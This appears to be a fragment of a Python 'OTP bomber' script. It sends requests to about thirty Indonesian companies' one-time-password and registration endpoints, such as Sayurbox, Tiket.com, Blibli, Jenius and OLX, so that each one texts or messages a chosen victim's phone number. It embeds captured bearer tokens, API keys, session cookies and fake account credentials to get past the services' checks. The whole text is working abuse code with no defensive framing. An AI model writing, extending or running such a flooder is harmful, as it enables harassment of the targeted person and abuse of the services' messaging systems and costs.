            alokpos=requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers={"Host": "api.qoalaplus.com","content-length": "48","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type": "application/json","origin": "https://www.qoalaplus.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.qoalaplus.com/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone_number":"+62"+nomor,"channel":"WA"})).text
            js=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
            ken=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'289','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.212.88","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc2NTc0LCJleHAiOjE2NjQ5Njg1NzQsImlhdCI6MTY2MjM3NjU3NCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.hbvAGWui1gSK26sEzhC9l790_JVobzkR3j82ZPi1hIwflbf-f08WTRbTraE7_6U_Q60QetC0Xk-GR3JndHodWuXvMbi0yIum8ghQ2fGG4ZR5F9RdPWOv0k1v10NyxOxUuWdfVUK_wMqoYZGK4klL2B3InPd-WMra4MhX9JoW91LBtpLx-tm5GLzPytX5hHINiqs6hZnvypbIBGqQr5oQp_ruJNezAfUBtYVmHdUahlJs1j9aD8IDF-86NVGGEfLjOMERi1cet4mf8uJmKn9ScIP18XMQVAdoxJnkVTwPQBOvQsP2EOMyh___hYvpjwe2T4qriGD1lpMgP2cHuf-dxw','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=js).text
            rupa = requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
            possing = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","content-length":"76","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","sec-ch-ua-platform":"Android","origin":"https://www.matahari.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"otp_request":{"mobile_number":"0"+nomor,"mobile_country_code":"+62"}})).text
            reqiu = requests.post("https://gql.tiket.com/",headers={"Host":"gql.tiket.com","content-length":"861","deviceid":"94c367e263f2084cf76955d6ed049664","newsession":"true","tiketsessionid":"c8da7b04-239c-49d8-a303-54f310e54734","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","channelid":"MOBILE","lang":"id","platform":"mweb","sec-ch-ua-platform":"Android","origin":"https://m.tiket.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.tiket.com/login","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"postOtpGenerateV2","variables":{"ignoreRecipient":"","recipient":"+62"+nomor,"deviceId":"484c6211-c182-4de8-a71f-8be3d9","requestType":"GUEST_VERIFY_PHONE","magicLinkAdditionalParameter":"type=SHOW_DETAIL_FORM&fieldStatus=UNREGISTERED"},"query":"mutation postOtpGenerateV2($recipient: String, $requestType: String, $ignoreRecipient: Boolean, $magicLinkAdditionalParameter: String, $fullName: String, $deviceId: String) {\n  otpGenerateV2(recipient: $recipient, requestType: $requestType, ignoreRecipient: $ignoreRecipient, magicLinkAdditionalParameter: $magicLinkAdditionalParameter, fullName: $fullName, deviceId: $deviceId) {\n    code\n    message\n    data {\n      exist\n      expired\n      maskedAccount\n      nextAvailableRequest\n      trxId\n      __typename\n    }\n    errors\n    serverTime\n    __typename\n  }\n}\n"})).text
            leceh = requests.post("https://apigw.ralali.com/auth/v3/register",headers={"Host":"apigw.ralali.com","content-length":"73","accept-language":"id","sec-ch-ua-mobile":"?1","authorization":"Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOjEwMDAwLCJ0b2tlbl92ZXJzaW9uIjoiMS4wLjAiLCJ0b2tlbl90eXBlIjoiZ3Vlc3RfdG9rZW4iLCJhdWQiOiIxMSIsImV4cCI6MTY2NDk2NTIwMCwianRpIjoiMjEzZDYyYmYtMzc3Zi0xNTQyLTgxMTktNmI0ZTk4NTQyZjY5IiwiaWF0IjoxNjY0ODc4ODAwLCJpc3MiOiIvZXgvdjMvdG9rZW4ifQ.gaglUqqmWA0WaORQsyLstjSq2G3OAGxp2CZ5lRshAUvDumYsCTIvatOkBc5s40qsLm0lxpGIERBdgkasWEI81HRk020cLMd_fjiqS74BLbfDMM2Mwro2e_9itqsKGwQlfoGOCSuMFzD1IXvp8yE4mcVsUq6JQzv5oUtmU3KP5SSoinGtxavVrn9Lqy299h_pGjmo1DpUfdq0fggKf3RdL28yJdI5JPV62PUwbJ1gdKOyr2bSLi6nfWRYl2eKnl8uViAo6TVN3Ojd5f5PnyH4UJPHw5XW2Kbf_fpnm0t9XXFYxBoVM9uLDzR2-Hh-DnNVoFublq4LdC5eP5x5dQE6cg","content-type":"application/json","accept":"application/json","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://m.ralali.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","accept-encoding":"gzip, deflate, br"},data=json.dumps({"otp_channel":"whatsapp","validate_by":"+62"+nomor,"name":"SanzXD"})).text
            yoyo = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent":"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip, deflate, br"},data=json.dumps({"phone":f"0"+nomor,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"})).text
            moka = requests.post("https://service.mokapos.com/account/v1/verification/phone/send",headers={  "accept": "application/json, text/plain, */*","authorization": "undefined","save-data": "on","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},data=json.dumps({"phone_number":f"+62"+nomor})).text
            AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
            map=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
            dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})).text
            jenius=requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
            req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
            pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
            bli=requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+nomor,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+nomor})).text
            ha=requests.post("https://pluang.com/api/user/register/send-otp",headers={'Host':'pluang.com','content-length':'112','sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'Android','content-type':'application/json','accept':'*/*','origin':'https://pluang.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pluang.com/register','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies={"cookie":"_gcl_au=1.1.634793654.1661960345","cookie":"_ga=GA1.2.217955334.1661960346","cookie":"_gid=GA1.2.1904059940.1661960346","cookie":"_gat_gtag_UA_124743364_3=1","cookie":"_fbp=fb.1.1661960347395.1573571703","cookie":"environment=production","cookie":"language=in","cookie":"WZRK_G=abf62dd1bf5f41edaa930f04872d1884","cookie":"cebs=1","cookie":"_tt_enable_cookie=1","cookie":"_ttp=ef83fe23-1e62-4741-9339-c077fd6d2076","cookie":"WZRK_S_R57-4Z9-9W6Z=%7B%22p%22%3A1%2C%22s%22%3A1661960351%2C%22t%22%3A1661960350%7D","cookie":"cebsp=1","cookie":"_ce.s=v~2dbcd906fa5fb9b378ebbd2642a150297d12fd70~vpv~0~v11slnt~1661960352042","cookie":"_ga_3RX02MCRS0=GS1.1.1661960345.1.1.1661960362.43.0.0","cookie":"_ga_824G2HJWD9=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_EHTZ6P30C7=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_ZXS1PKZ40M=GS1.1.1661960346.1.1.1661960362.0.0.0"},data=json.dumps({"name":"Shshshiskabzbz","email":"ammarexecuted@gmail.com","phone":"0"+nomor,"csrfToken":"pluangCsrfToken"})).text
            pos=requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"s6abXpSHh6_mTsxfvOynJM","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":0})).text
            req=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor})).text
            head={    'authority': 'www.oto.com',    'accept': 'application/json, text/javascript, */*; q=0.01',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    'origin': 'https://www.oto.com',    'referer': 'https://www.oto.com/ovb/user-login',    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',    'sec-ch-ua-mobile': '?0',    'sec-ch-ua-platform': '"Linux"',    'sec-fetch-dest': 'empty',    'sec-fetch-mode': 'cors',    'sec-fetch-site': 'same-origin',    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',    'x-requested-with': 'XMLHttpRequest',}
            response = requests.post('https://www.oto.com/ovb/send-otp', params={    'lang': 'id',}, cookies={    'primary_utm_campaign': 'organic',    'primary_utm_medium': 'organic',    'primary_utm_source': 'yahoo',    'utm_campaign': 'organic',    'utm_medium': 'organic',    'utm_source': 'yahoo',    'landing_url': 'https%3A%2F%2Fwww.oto.com%2F',    '_csrf': 'aG2nJALlO7VyltTb-atrM-_EXaThOQri',    'GCLB': 'CPH61KyGt9yB2wE',    '_gcl_au': '1.1.60394401.1662191705',    '_pbjs_userid_consent_data': '3524755945110770',    'pbjs-pubCommonId': '0c3d7536-4c41-4e8c-8078-ede03a294dfe',    '_ga': 'GA1.2.1220515766.1662191705',    '_gid': 'GA1.2.525526430.1662191705',    '_gat': '1',    '_co_session_active': '1',    '_CO_anonymousId': '65ad5b8b-31fe-0728-c3ce-e208c717c122',    '_CO_type': 'connecto',    '_fbp': 'fb.1.1662191705704.1893770966',    '_dc_gtm_UA-58094033-8': '1',    '_lr_retry_request': 'true',    '_lr_env_src_ats': 'false',    '__gads': 'ID=0d3fa2b6107a5244:T=1662191707:S=ALNI_MbMDDAdViTY4nYB086vSjMp8axBUw',    '__gpi': 'UID=0000096baa896e74:T=1662191707:RT=1662191707:S=ALNI_MbpMPTZyUO8x5wnAh3T1Qq5rVKPDw',    'pubmatic-unifiedid': '%7B%22TDID%22%3A%22b8d808f8-e3d6-4b01-bfb5-34a077fe952a%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222022-08-03T07%3A55%3A08%22%7D',    'panoramaId_expiry': '1662796507670',    '_cc_id': 'a270b7341af8c173e8f2aa3f71b7accd',    'panoramaId': '3cc178a793a7f2c651c73fe7475c16d53938dce698845cc3fb7fea782d2fbcf3',    'pbjs_debug': '0',    'page_view': '1',    'cto_bidid': 'ilf0CV9KN1ZCRzExY1NYMXNqVmclMkJlZ3k4azlIem9NbHhaa1pXYWlCQlhmJTJCVjdCMGhwOUhkRWV4UTNoOFhMbjVLaXpUT2JiN24yNEhCOER6RDZuVFVpSWpYdVElM0QlM0Q',    'cto_bundle': 'yx0Sy185U09IckR1WW4waUNkSmpoY1VFMGdVa2dZSk1VdEYlMkY2bSUyQmhDSG0lMkJ2ZFRUR0FPaG5nTHFrY1ZiQ2IzSGtodmE5dWExeDVNdllUcW1tMXFmMnQ2WUQwZVc1dEREaGJjZ1ZhVzlDZmpzWlQzayUzRA',}, headers=head, data={    'mobile': nomor,    'bookingId': '0',    'businessUnit': 'mobil',})
            singsing=requests.post("https://api.momobil.id/users/otp/send",headers={"Host":"api.momobil.id","Connection":"keep-alive","Content-Length":"39","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Content-Type":"application/json","Accept":"*/*","Origin":"https://momobil.id","Sec-Fetch-Site":"same-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://momobil.id/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"to":"0"+nomor,"type":"register"})).text
            posting=requests.post("https://api.qoala.app/api/registrations",headers={"Host":"api.qoala.app","content-length":"202","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.qoala.app","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.qoala.app/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"fullName":"Hsjsnsns","email":"ammarexecuted@gmail.com","phoneNumber":"+62"+nomor,"identityType":"KTP","nationality":"ID","password":"Abc167@ggwp","passwordConfirmation":"Abc167@ggwp","lang":"id"})).text
            last=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"sms","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
            ammar_gamteng=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'284','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.213.33","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc3NTA5LCJleHAiOjE2NjQ5Njk1MDksImlhdCI6MTY2MjM3NzUwOSwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.jgaFjb95AibZL_GegkpMlRWkV1epP4zMUfSbCZEbY7BYwIQjBb3eZn8QVi8OMBn8ejYz1o3zn6JM0gRqFtiH1CsCwIyr9gSQuTwUn_pHhaJNE6-i2omxAA94MY8T7kHNyEV0kE50yx2-oT0gMWF2BWt65tUjFfV_29qx9RajFlV8z75iQ78JTtm595jd3--zWBrCyUzDy994w2Hwm5keGlBZuwDKPPofBPI7fsqMdouLIzjXVHrU5t_tA8Pij5QPqia9hW2W0BTlSSWc8wf6CELMKheFA3P8bvxlgCCVQ4WckdPH3iS_pglVAqeHW5z8nJxYnPKmvIzuPucoZlPyfg','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=last).text
            kum = requests.post("https://graphql-v4.kumparan.com/query",headers={"Host":"graphql-v4.kumparan.com","content-length":"179","accept":"*/*","content-type":"text/plain","env-client":"d52f487fa02230a23dbdc6e5a67545ddc59e4766d0a326d3f4a814b74ecc045e9382fed825b0d75ec7fa16588a50d75d","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://m.kumparan.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.kumparan.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"CreateOTPAndSendSMS","variables":{"phone":nomor},"query":"mutation CreateOTPAndSendSMS($phone: String!) {\n  CreateOTPAndSendSMS(phone: $phone)\n}\n"})).text
            poss = requests.post("https://ua.ctcorpmpc.com/blade-user/api/user/getotp",headers={"Host":"ua.ctcorpmpc.com","Connection":"keep-alive","Content-Length":"148","Blade-Auth":"Bearer 22222","sec-ch-ua-mobile":"?1","Authorization":"Basic c3dvcmQ6c3dvcmRfc2VjcmV0","Content-Type":"application/json;charset=UTF-8","User-Agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","X-requested-With":"XMLHttpRequest","Tenant-Id":"000000","sec-ch-ua-platform":"Android","Accept":"*/*","Origin":"https://ua.ctcorpmpc.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://ua.ctcorpmpc.com/cas-web/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNo":nomor,"tplId":"4001001","tms":1662434407722,"requestId":"6e1b8c1c-fe2f-4418-851b-d31af02f0c221662434407722","intlPhoneCode":"62"})).text
